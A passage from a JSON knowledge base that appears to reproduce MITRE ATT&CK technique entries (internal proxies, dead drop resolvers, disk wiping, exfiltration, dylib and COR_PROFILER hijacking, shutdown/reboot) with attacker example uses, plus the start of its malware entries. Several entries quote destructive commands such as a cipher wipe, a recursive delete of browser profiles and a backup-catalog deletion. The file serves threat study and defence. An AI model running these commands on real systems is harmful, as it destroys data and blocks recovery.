      "can create a named pipe to listen for and send data to a named pipe-based C2 server.",
      "can leverage a peer-to-peer C2 profile between agents.",
      "The  HTTP/S C2 mode can make use of a local proxy.",
      "has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.",
      "can can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines.",
      "can used pipes to connect machines with restricted internet access to remote machines via other infected hosts.",
      "has used internal nodes on the compromised network for C2 communications.",
      "The ZJ variant of  allows ZJ link infections with Internet access to relay traffic from ZJ listen to a command server.",
      "has used the built-in  `port proxy` command to create proxies on compromised systems to facilitate access.",
      "can proxy C2 communications including to and from internal agents without internet connectivity.",
      "has compromised internal network systems to act as a proxy to forward traffic to C2.",
      "can function as a proxy to create a server that relays communication between the client and C&C server or between two clients.",
      "has used a compromised router to serve as a proxy between a victim network's corporate and restricted segments.",
      "During  threat actors proxied traffic through multiple infected systems.",
      "can create a named pipe to listen for and send data to a named pipe-based C2 server.",
      "supports peer connections.",
      "used custom tools to create SOCK5 and custom protocol proxies between infected hosts.",
      "installs an RPC server for P2P communications.",
      "has tunneled traffic from victims through an internal compromised host to proxy communications to command and control nodes.",
      "has used publicly available tools such as the Venom proxy tool to proxy traffic out of victim environments.",
      "has a built-in SOCKS5 proxying capability allowing for  clients to proxy network traffic through other clients within a victim network.",
      "can start a reverse proxy to initiate connections to arbitrary endpoints in victim networks.",
      "During   used the built-in netsh portproxy command to create internal proxies on compromised systems."
    ],
    "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
    "similar_words": [
      "Internal Proxy"
    ],
    "id": "T1090.001"
  },
  "attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7": {
    "name": "Dead Drop Resolver",
    "example_uses": [
      "can store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook.",
      "collects C2 information via a dead drop resolver.",
      "The  Windows variant has retrieved C2 addresses from encoded data in posts on tech community forums.",
      "Some  components use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.",
      "can obtain C2 information from Google Docs.",
      "has used YouTube to store and hide C&C server domains.",
      "uses Pastebin to store C2 addresses.",
      "can retrieve C2 domain information from actor-controlled S3 buckets.",
      "has used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.",
      "During   used dead drop resolvers on two separate tech community forums for their  Windows-version backdoor; notably  updated the community forum posts frequently with new dead drop resolvers during the campaign.",
      "uses Microsofts TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server.",
      "has used an RSS feed on Livejournal to update a list of encrypted C2 server names.  has also hidden  C2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain.",
      "used legitimate websites for C2 through dead drop resolvers (DDR) including GitHub Pastebin and Microsoft TechNet.",
      "can use Twitter Reddit Imgur and other websites to get a C2 URL.",
      "has used an RSS feed on Livejournal to update a list of encrypted C2 server names.",
      "MSGET downloader uses a dead drop resolver to access malicious payloads.",
      "hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.",
      "can read C2 information from Google Documents and YouTube.",
      "can obtain a webpage hosted on Pastebin to update its C2 domain list.",
      "has used a dead drop resolver to retrieve configurations and commands from a public blog site.",
      "has used  and a dead drop resolver to retrieve configurations and commands from a public blog site."
    ],
    "description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "similar_words": [
      "Dead Drop Resolver"
    ],
    "id": "T1102.001"
  },
  "attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade": {
    "name": "Junk Data",
    "example_uses": [
      "added junk data to outgoing UDP packets to peer implants.",
      "inserts pseudo-random characters between each original character during encoding of C2 network requests making it difficult to write signatures on them.",
      "has obfuscated the FML.dll with 200MB of junk data.",
      "has used byte randomization to obscure its behavior.",
      "has used random identifier strings to obscure its C2 operations and result codes.",
      "can add extra characters in encoded strings to help mimic DNS legitimate requests.",
      "can send randomly-generated data as part of its C2 communication.",
      "samples were found to be highly obfuscated with junk code.",
      "can generate a sequence of dummy HTTP C2 requests to obscure traffic.",
      "has used decoy traffic to surround its malicious network traffic to avoid detection.",
      "added junk bytes to its C2 over HTTP.",
      "can insert pseudo-random characters into its network encryption setup.",
      "can pad C2 messages with random generated values.",
      "added junk data to each encoded string preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a junk length value when created tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.",
      "can use junk data in the Base64 string for additional obfuscation.",
      "retrieves a non-existent webpage from the command and control server then parses commands from the resulting error logs to decode commands to the web shell."
    ],
    "description": "Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ",
    "similar_words": [
      "Junk Data"
    ],
    "id": "T1001.001"
  },
  "attack-pattern--f870408c-b1cd-49c7-a5c7-0ef0fc496cc6": {
    "name": "Spearphishing Service",
    "example_uses": [
      "During   sent Telegram messages impersonating IT personnel to harvest credentials."
    ],
    "description": "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.(Citation: ThreatPost Social Media Phishing) These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
    "similar_words": [
      "Spearphishing Service"
    ],
    "id": "T1598.001"
  },
  "attack-pattern--f8ef3a62-3f44-40a4-abca-761ab235c436": {
    "name": "Container API",
    "example_uses": [
      "can query the Kubernetes API for secrets."
    ],
    "description": "Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API)An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ",
    "similar_words": [
      "Container API"
    ],
    "id": "T1552.007"
  },
  "attack-pattern--f9cc4d06-775f-4ee1-b401-4e2cc0da30ba": {
    "name": "Domains",
    "example_uses": [
      "has used compromised domains to host links targeted to specific phishing victims.",
      "has compromised domains for some of their infrastructure including for C2 and staging malware.",
      "For the   compromised domains to use for C2.",
      "has compromised domains for use in targeted malicious campaigns.",
      "For   compromised domains in Italy and other countries for their C2 infrastructure.",
      "For  the threat actors used legitimate but compromised domains to host malicious payloads.",
      "During  UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.",
      "operates a global network of compromised websites that redirect into a traffic distribution system (TDS) to select victims for a fake browser update page.",
      "has compromised legitimate sites and used them to distribute malware.",
      "hijacked FQDNs associated with legitimate websites hosted by hop points.",
      "has used compromised legitimate domains to as a delivery network for malicious payloads."
    ],
    "description": "Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account, taking advantage of renewal process gaps, or compromising a cloud service that enables managing domains (e.g., AWS Route53).(Citation: Krebs DNS Hijack 2019)Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)",
    "similar_words": [
      "Domains"
    ],
    "id": "T1584.001"
  },
  "attack-pattern--f9e9365a-9ca2-4d9c-8e7c-050d73d1101a": {
    "name": "SQL Stored Procedures",
    "example_uses": [
      "During the   used various MS-SQL stored procedures.",
      "used xp_cmdshell to store and execute SQL code."
    ],
    "description": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) ",
    "similar_words": [
      "SQL Stored Procedures"
    ],
    "id": "T1505.001"
  },
  "attack-pattern--fa44a152-ac48-441e-a524-dd7b04b8adcd": {
    "name": "Network Device Authentication",
    "example_uses": [
      "can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password.",
      "has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device."
    ],
    "description": "Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.(Citation: Mandiant - Synful Knock)",
    "similar_words": [
      "Network Device Authentication"
    ],
    "id": "T1556.004"
  },
  "attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac": {
    "name": "Disk Content Wipe",
    "example_uses": [
      "iterates over device file identifiers on the target opens the device file and either overwrites the file or calls various IOCTLS commands to erase it.",
      "can overwrite sectors of a victim host's hard drive at periodic offsets.",
      "has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and finally attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.",
      "has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.",
      "can wipe deleted data from all drives using cipher.exe.",
      "can wipe the accessible physical or logical drives of the infected machine.",
      "has the ability to corrupt disk partitions and obtain raw disk access to destroy data.",
      "has the ability to wipe VM snapshots on compromised networks.",
      "deletes files following overwriting them with random data.",
      "has used tools to delete files and folders from victims' desktops and profiles.",
      "searches for files on available drives based on a list of extensions hard-coded into the sample for follow-on wipe activity.",
      "has the capability to wipe a portion of an infected device's firmware.",
      "can be used to overwrite deleted data in specified folders.",
      "can wipe deleted data from all drives using .",
      "During   used the native Microsoft utility  to securely wipe files and folders  overwriting the deleted data using cmd.exe /c cipher /W:C.",
      "includes functionality to overwrite victim devices with the content of a buffer to wipe disk content.",
      "has deleted all files in the Mozilla directory using the following command: `/c del /q /f /s C:\\Users\\User\\AppData\\Roaming\\Mozilla\\firefox*`."
    ],
    "description": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",
    "similar_words": [
      "Disk Content Wipe"
    ],
    "id": "T1561.001"
  },
  "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b": {
    "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
    "example_uses": [
      "malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.",
      "has used FTP to exfiltrate collected data.",
      "can exfiltrate data via a DNS tunnel or email separately from its C2 channel.",
      "has used the curl --upload-file command to exfiltrate data over HTTP.",
      "can upload collected data and files to an FTP server.",
      "can send captured credentials to C2 via HTTP `GET` or `POST` requests.",
      "has used FTP to exfiltrate reconnaissance data out.",
      "Some  variants have used South Korea's Daum email service to exfiltrate information and later variants have posted the data to a web server via an HTTP post command.",
      "can send victim data via FTP with credentials hardcoded in the script.",
      "exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.",
      "has used WinSCP to exfiltrate data from a targeted organization over FTP.",
      "backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.",
      "has exfiltrated data in HTTP POST headers.",
      "has exfiltrated victim information using FTP.",
      "has routines for exfiltration over SMTP FTP and HTTP.",
      "has used  for exfiltration.",
      "During   exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.",
      "has exfiltrated data over FTP separately from its primary C2 channel over DNS.",
      "uses HTTP to send data to the C2 server.",
      "can be used to create  to upload files from a compromised host.",
      "exfiltrates logs of its execution stored in the /tmp folder over FTP using the curl command.",
      "has used FTP to exfiltrate files (separately from the C2 channel).",
      "may be used to exfiltrate data separate from the main command and control protocol.",
      "has sent stolen payment card data to remote servers via HTTP POSTs.",
      "can exfiltrate credentials and other information via HTTP POST request TCP and DNS.",
      "has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.",
      "can exfiltrate data directly to its C2 domain via HTTP.",
      "exfiltrates files over FTP.",
      "can exfiltrate data over FTP or HTTP including HTTP via WebDAV.",
      "has exfiltrated configuration files from exploited network devices over FTP and TFTP.",
      "has exfiltrated data via Microsoft Exchange and over FTP separately from its primary C2 channel over DNS."
    ],
    "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
    "similar_words": [
      "Exfiltration Over Unencrypted Non-C2 Protocol"
    ],
    "id": "T1048.003"
  },
  "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490": {
    "name": "Dylib Hijacking",
    "example_uses": [
      "has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application."
    ],
    "description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with @rpath, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the LC_LOAD_WEAK_DYLIB function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
    "similar_words": [
      "Dylib Hijacking"
    ],
    "id": "T1574.004"
  },
  "attack-pattern--fc74ba38-dc98-461f-8611-b3dbf9978e3d": {
    "name": "Downgrade System Image",
    "example_uses": [],
    "description": "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  ",
    "similar_words": [
      "Downgrade System Image"
    ],
    "id": "T1601.002"
  },
  "attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2": {
    "name": "Local Accounts",
    "example_uses": [
      "has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.",
      "can brute force a local admin password then use it to facilitate lateral movement.",
      "can use known credentials to run commands and spawn processes as a local user account.",
      "has created admin accounts on a compromised host.",
      "has moved laterally using the Local Administrator account.",
      "has used legitimate local admin account credentials.",
      "has used known administrator account credentials to execute the backdoor directly.",
      "has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.",
      "has used compromised credentials for access as SYSTEM on Exchange servers.",
      "During the   used compromised local accounts to access victims' networks.",
      "targets dormant or inactive user accounts accounts belonging to individuals no longer at the organization but whose accounts remain on the system for access and persistence.",
      "can use valid credentials with  or wmic to spread itself to remote systems.",
      "creates valid local users to provide access to the system.",
      "During  threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.",
      "has abused local accounts that have the same password across the victims network.",
      "has used valid local accounts to gain initial access.",
      "compromised cPanel accounts in victim environments.",
      "used captured local account information such as service accounts for actions during .",
      "accessed vulnerable Cisco switch devices using accounts with administrator privileges.",
      "can use a compromised local account for lateral movement."
    ],
    "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ",
    "similar_words": [
      "Local Accounts"
    ],
    "id": "T1078.003"
  },
  "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc": {
    "name": "System Shutdown/Reboot",
    "example_uses": [
      "reboots the target system once the various wiping processes are complete.",
      "has a function to sleep for two hours before rebooting the system.",
      "has been observed shutting down infected systems.",
      "will shut down the compromised system after it is done modifying system configuration settings.",
      "has used a custom MBR wiper named BOOTWRECK which will initiate a system reboot after wiping the victim's MBR.",
      "has issued a shutdown command on a victim machine that upon reboot will run the ransomware within a VM.",
      "has used malware that will issue the command shutdown /r /t 1 to reboot a system after wiping its MBR.",
      "can shutdown and reboot the victim machine.",
      "can shutdown a compromised host through execution of `ExitWindowsEx` with the `EXW_SHUTDOWN` flag.",
      "attempts to reboot the machine by terminating specific processes.",
      "will reboot the system one hour after infection.",
      "has rebooted systems after destroying files and wiping the MBR on infected systems.",
      "will reboot the infected system once the wiping functionality has been completed.",
      "can initiate a system shutdown.",
      "s Linux variant has terminated ESXi virtual machines.",
      "uses elevated privileges to call NtRaiseHardError to induce a blue screen of death on infected systems causing a system crash. Once shut down the system is no longer bootable.",
      "reboots the infected system following wiping and related tasks to prevent system recovery.",
      "reboots the victim machine following wiping and related activity.",
      "has the ability to restart compromised hosts.",
      "can reboot or shutdown the targeted system or logoff the current user.",
      "includes functionality to reboot the victim system following wiping actions similar to .",
      "can initiate a system reboot or shutdown.",
      "can restart the victim system if it encounters an error during execution and will forcibly shutdown the system following encryption to lock out victim users.",
      "has used the `shutdown`command to shut down and/or restart the victim system.",
      "has used `ShellExecuteA` to shut down and restart the victim system."
    ],
    "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. reload).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A) They may also include shutdown/reboot of a virtual machine via hypervisor / cloud consoles or command line tools.Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
    "similar_words": [
      "System Shutdown/Reboot"
    ],
    "id": "T1529"
  },
  "attack-pattern--ffbcfdb0-de22-4106-9ed3-fc23c8a01407": {
    "name": "MMC",
    "example_uses": [
      "used Microsoft Management Console Snap-In Control files or MSC files executed via MMC to run follow-on PowerShell commands during ."
    ],
    "description": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)For example, mmc C:\\Users\\foo\\admintools.msc /a will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: wbadmin.msc may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the Link to Web Address snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\\path\\to\\test.msc.(Citation: abusing_com_reg)",
    "similar_words": [
      "MMC"
    ],
    "id": "T1218.014"
  },
  "attack-pattern--ffe59ad3-ad9b-4b9f-b74f-5beb3c309dc1": {
    "name": "Process Argument Spoofing",
    "example_uses": [
      "can use spoof arguments in spawned processes that execute beacon commands.",
      "has the ability to modify its process memory to hide process command-line arguments."
    ],
    "description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)Adversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) WriteProcessMemory() function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)This behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",
    "similar_words": [
      "Process Argument Spoofing"
    ],
    "id": "T1564.010"
  },
  "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335": {
    "name": "COR_PROFILER",
    "example_uses": [
      "has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.",
      "can detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active."
    ],
    "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)",
    "similar_words": [
      "COR_PROFILER"
    ],
    "id": "T1574.012"
  },
  "malware--00e7d565-9883-4ee5-b642-8fd17fd6a3f5": {
    "name": "EKANS",
    "description": "[EKANS](https://attack.mitre.org/software/S0605) is ransomware variant written in Golang that first appeared in mid-December 2019 and has been used against multiple sectors, including energy, healthcare, and automotive manufacturing, which in some cases resulted in significant operational disruptions. [EKANS](https://attack.mitre.org/software/S0605) has used a hard-coded kill-list of processes, including some associated with common ICS software platforms (e.g., GE Proficy, Honeywell HMIWeb, etc), similar to those defined in [MegaCortex](https://attack.mitre.org/software/S0576).(Citation: Dragos EKANS)(Citation: Palo Alto Unit 42 EKANS)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "EKANS"
    ],
    "id": "S0605"
  },
  "malware--01dbc71d-0ee8-420d-abb4-3dfb6a4bf725": {
    "name": "BLINDINGCAN",
    "description": "[BLINDINGCAN](https://attack.mitre.org/software/S0520) is a remote access Trojan that has been used by the North Korean government since at least early 2020 in cyber operations against defense, engineering, and government organizations in Western Europe and the US.(Citation: US-CERT BLINDINGCAN Aug 2020)(Citation: NHS UK BLINDINGCAN Aug 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BLINDINGCAN"
    ],
    "id": "S0520"
  },
  "malware--023254de-caaf-4a05-b2c7-e4e2f283f7a5": {
    "name": "Ninja",
